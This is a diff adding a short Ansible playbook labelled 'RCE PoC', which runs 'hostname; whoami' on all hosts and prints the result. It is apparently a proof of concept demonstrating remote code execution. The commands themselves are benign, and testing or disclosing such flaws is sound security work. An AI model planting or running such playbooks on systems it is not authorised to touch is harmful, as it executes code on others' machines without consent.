@@ -1,0 +1,10 @@
+---
+- name: RCE PoC
+  hosts: all
+
+  tasks:
+    - name: Hostname, whoami
+      shell: hostname; whoami;
+      register: out
+
+    - debug: var=out.stdout_lines
